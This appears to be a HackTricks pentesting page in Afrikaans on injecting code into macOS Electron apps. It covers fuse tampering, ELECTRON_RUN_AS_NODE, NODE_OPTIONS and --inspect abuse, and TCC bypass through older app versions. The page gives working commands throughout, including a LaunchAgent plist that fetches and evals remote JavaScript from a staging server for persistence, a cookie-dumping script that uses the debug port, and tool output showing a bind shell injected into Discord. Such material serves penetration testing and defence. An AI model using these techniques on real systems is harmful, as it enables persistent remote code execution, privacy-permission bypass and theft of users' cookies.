# macOS Elektron Toepassingsinspuiting

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Maar vir nou weet net dat Electron **node** uitvoer.\
En node het sekere **parameters** en **omgewingsveranderlikes** wat gebruik kan word om **ander kode uit te voer** as die aangeduide lêer.

### Electron Smeltpunte

Hierdie tegnieke sal binnekort bespreek word, maar onlangs het Electron verskeie **sekuriteitsvlae bygevoeg om dit te voorkom**. Dit is die [**Electron Smeltpunte**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is die eenhede wat gebruik word om te **voorkom** dat Electron-toepassings in macOS **arbitrêre kode laai**:

* **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
* **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit voorkom sodoende die inspuiting van kode.
* **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaai **`asar`**-lêer deur macOS geverifieer word. Dit voorkom sodoende **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
* **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs soek en gebruik maak van app.asar in plaas van die volgende volgorde: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`**-smeltpunt, dit **onmoontlik** is om nie-gevalideerde kode te laai nie.
* **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaierproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshoot.

'n Ander interessante smeltpunt wat nie kode-inspuiting sal voorkom nie, is:

* **EnableCookieEncryption**: As dit geaktiveer is, word die koekie-stoor op skyf geënkripteer met behulp van kriptografiese sleutels op OS-vlak.

### Kontroleer Electron Smeltpunte

Jy kan **hierdie vlae kontroleer** vanuit 'n toepassing met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Wysiging van Electron Smelte

Soos die [**dokumentasie aandui**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), word die konfigurasie van die **Electron Smelte** gekonfigureer binne die **Electron binêre lêer** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.

In macOS-toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Jy kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en soek na die vorige string. Na hierdie string kan jy in ASCII 'n nommer "0" of "1" sien wat aandui of elke smelting uitgeschakel of geaktiveer is. Verander net die hekskode (`0x30` is `0` en `0x31` is `1`) om die smeltwaardes te **verander**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let daarop dat as jy probeer om die **`Electron Framework` binêre lêer** binne 'n toepassing te **oorwrite** met hierdie gewysigde bytes, sal die toepassing nie uitgevoer word nie.

## RCE kode byvoeging tot Electron-toepassings

Daar kan **eksterne JS/HTML-lêers** wees wat 'n Electron-toepassing gebruik, sodat 'n aanvaller kode in hierdie lêers kan inspuit waarvan die handtekening nie nagegaan sal word nie en arbitrêre kode in die konteks van die toepassing kan uitvoer.

{% hint style="danger" %}
Daar is egter tans 2 beperkings:

* Die **`kTCCServiceSystemPolicyAppBundles`**-toestemming is **nodig** om 'n toepassing te wysig, dus is dit standaard nie meer moontlik nie.
* Die gekompileerde **`asap`**-lêer het gewoonlik die smeltings **`embeddedAsarIntegrityValidation`** en **`onlyLoadAppFromAsar`** geaktiveer

Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).
{% endhint %}

Let daarop dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na 'n ander gids (soos **`/tmp`**) te kopieer, die vouer **`app.app/Contents`** na **`app.app/NotCon`** te hernoem, die **asar**-lêer met jou **skadelike** kode te wysig, dit terug te hernoem na **`app.app/Contents`** en dit uit te voer.

Jy kan die kode uit die asar-lêer uitpak met:
```bash
npx asar extract app.asar app-decomp
```
En pak dit terug nadat dit gewysig is met:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Volgens [**die dokumentasie**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), as hierdie omgewingsveranderlike ingestel is, sal dit die proses begin as 'n normale Node.js-proses.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
As die **`RunAsNode`**-fusie gedeaktiveer is, sal die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word en sal dit nie werk nie.
{% endhint %}

### Inspruiting vanaf die App Plist

Soos [**hier voorgestel**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewingsveranderlike in 'n plist misbruik om volhardendheid te handhaaf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die payload in 'n ander lêer stoor en dit uitvoer:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
As die **`EnableNodeOptionsEnvironmentVariable`**-fusie **uitgeschakel** is, sal die app die omgewingsveranderlike **NODE\_OPTIONS** ignoreer wanneer dit geloods word, tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook geignoreer sal word as die **`RunAsNode`**-fusie uitgeschakel is.

As jy nie **`ELECTRON_RUN_AS_NODE`** instel nie, sal jy die fout vind: `Meeste NODE_OPTIONs word nie ondersteun in gepakette apps nie. Sien dokumentasie vir meer besonderhede.`
{% endhint %}

### Inspruiting vanaf die App Plist

Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspeksie

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) bron, as jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, sal 'n **debuutpoort oop wees** sodat jy daarmee kan verbind (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarin in te spuit** of selfs nuwe prosesse te begin.\
Byvoorbeeld:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
As die **`EnableNodeCliInspectArguments`**-fusie gedeaktiveer is, sal die app **node parameters ignoreer** (soos `--inspect`) wanneer dit geloods word tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** ingestel is, wat ook **geïgnoreer** sal word as die **`RunAsNode`**-fusie gedeaktiveer is.

Jy kan egter steeds die **electron parameter `--remote-debugging-port=9229`** gebruik, maar die vorige lading sal nie werk om ander prosesse uit te voer nie.
{% endhint %}

Deur die parameter **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel, soos die **geskiedenis** (met GET-opdragte) of die **koekies** van die blaaier (aangesien hulle binne die blaaier **gedekodeer** word en daar 'n **json-eindpunt** is wat dit sal gee).

Jy kan leer hoe om dit te doen [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en gebruik die outomatiese instrument [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) of 'n eenvoudige skripsie soos:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**hierdie blogpos**](https://hackerone.com/reports/1274695) word hierdie foutopsporing misbruik om 'n headless chrome **willekeurige lêers in willekeurige plekke af te laai**.

### Injeksie vanaf die App Plist

Jy kan hierdie omgewingsveranderlike misbruik in 'n plist om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC-omseiling deur Ouer Weergawes te misbruik

{% hint style="success" %}
Die TCC-daemon van macOS kontroleer nie die uitgevoerde weergawe van die toepassing nie. As jy dus nie kode in 'n Electron-toepassing kan inspuit nie met enige van die vorige tegnieke nie, kan jy 'n vorige weergawe van die toepassing aflaai en kode daarin inspuit, aangesien dit steeds die TCC-voorregte sal kry (tensy Trust Cache dit voorkom).
{% endhint %}

## Voer nie-JS-kode uit

Die vorige tegnieke sal jou in staat stel om **JS-kode binne die proses van die Electron-toepassing** uit te voer. Onthou egter dat die **kindprosesse onder dieselfde sandputprofiel** as die ouertoepassing uitgevoer word en **hul TCC-toestemmings oorneem**.\
Daarom, as jy byvoorbeeld misbruik wil maak van toestemmings om toegang tot die kamera of mikrofoon te verkry, kan jy eenvoudig **'n ander binêre lêer vanuit die proses uitvoer**.

## Outomatiese Inspruiting

Die instrument [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om kwesbare Electron-toepassings wat geïnstalleer is, te vind en kode daarin in te spuit. Hierdie instrument sal probeer om die **`--inspect`**-tegniek te gebruik:

Jy moet dit self kompileer en kan dit so gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Verwysings

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
